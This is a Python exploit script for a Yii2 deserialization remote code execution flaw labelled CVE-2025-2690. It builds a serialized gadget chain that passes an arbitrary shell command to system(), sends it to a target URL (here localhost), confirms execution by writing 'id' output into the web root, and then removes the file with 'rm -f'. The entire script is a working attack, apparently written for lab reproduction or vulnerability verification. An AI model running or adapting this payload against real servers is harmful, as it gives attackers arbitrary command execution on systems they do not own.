#!/usr/bin/env python3
import requests
import base64
import sys
import time

TARGET_URL = "http://localhost:8082"

def generate_yii2_rce_payload(command):
    """
    Yii2 RCE chain: BatchQueryResult::__destruct() -> Faker\Generator -> IndexAction::run()
    Uses call_user_func($this->checkAccess, $this->id) to execute system command
    """
    bqr_class = "yii\\db\\BatchQueryResult"
    faker_class = "Faker\\Generator"
    index_action_class = "yii\\rest\\IndexAction"
    
    datareader_key = "\x00" + bqr_class + "\x00_dataReader"
    formatters_key = "\x00*\x00formatters"
    
    payload = (
        f'O:{len(bqr_class)}:"{bqr_class}":1:{{'
        f's:{len(datareader_key)}:"{datareader_key}";'
        f'O:{len(faker_class)}:"{faker_class}":1:{{'
        f's:{len(formatters_key)}:"{formatters_key}";'
        f'a:1:{{'
        f's:5:"close";'
        f'a:2:{{'
        f'i:0;'
        f'O:{len(index_action_class)}:"{index_action_class}":2:{{'
        f's:11:"checkAccess";s:6:"system";'
        f's:2:"id";s:{len(command)}:"{command}";'
        f'}}'
        f'i:1;s:3:"run";'
        f'}}'
        f'}}'
        f'}}'
        f'}}'
    )
    return payload

def test_connection():
    print("[*] Testing connection to target...")
    try:
        resp = requests.get(TARGET_URL, timeout=10)
        if resp.status_code == 200:
            print(f"[+] Target is accessible (Status: {resp.status_code})")
            if "VULNERABLE" in resp.text:
                print("[+] Vulnerable Yii2 environment detected")
            return True
    except Exception as e:
        print(f"[-] Connection failed: {e}")
    return False

def exploit(payload):
    encoded_payload = base64.b64encode(payload.encode('latin-1')).decode()
    try:
        resp = requests.get(f"{TARGET_URL}/?data={encoded_payload}", timeout=30)
        return True, resp
    except Exception as e:
        print(f"[-] Request failed: {e}")
        return False, None

def verify_rce():
    print("\n[*] Testing RCE...")
    
    output_file = "/var/www/html/rce_result.txt"
    cmd = f"id > {output_file}"
    
    print(f"[*] Command: {cmd}")
    payload = generate_yii2_rce_payload(cmd)
    print(f"[*] Payload length: {len(payload)} bytes")
    
    success, resp = exploit(payload)
    if not success:
        return False
    
    print(f"[+] Exploit request sent")
    time.sleep(1)
    
    try:
        resp = requests.get(f"{TARGET_URL}/rce_result.txt", timeout=10)
        if resp.status_code == 200 and ("uid=" in resp.text or "www-data" in resp.text):
            print(f"\n[+] RCE CONFIRMED!")
            print(f"[+] Command output: {resp.text.strip()}")
            
            cleanup_payload = generate_yii2_rce_payload(f"rm -f {output_file}")
            exploit(cleanup_payload)
            return True
        else:
            print(f"[-] Result file status: {resp.status_code}")
    except Exception as e:
        print(f"[-] Failed to check result: {e}")
    
    return False

def main():
    print("=" * 70)
    print("CVE-2025-2690 - Yii2 Deserialization RCE Exploit")
    print("=" * 70)
    print(f"Target: {TARGET_URL}")
    print("Vulnerability: Unsafe unserialize() leads to RCE")
    print("Gadget Chain: BatchQueryResult -> Faker\\Generator -> IndexAction")
    print("=" * 70)
    
    if not test_connection():
        print("\n[-] FAILED: Cannot connect to target")
        return False
    
    if verify_rce():
        print("\n" + "=" * 70)
        print("[+] SUCCESS: CVE-2025-2690 VULNERABILITY CONFIRMED")
        print("=" * 70)
        print("\nExploit Details:")
        print("  - Vulnerable component: yiisoft/yii2 < 2.0.38")
        print("  - Attack vector: Deserialization of untrusted data")
        print("  - Impact: Remote Code Execution (RCE)")
        print("  - CVSS: 9.8 (Critical)")
        return True
    else:
        print("\n[-] RCE verification failed")
        return False

if __name__ == "__main__":
    result = main()
    sys.exit(0 if result else 1)
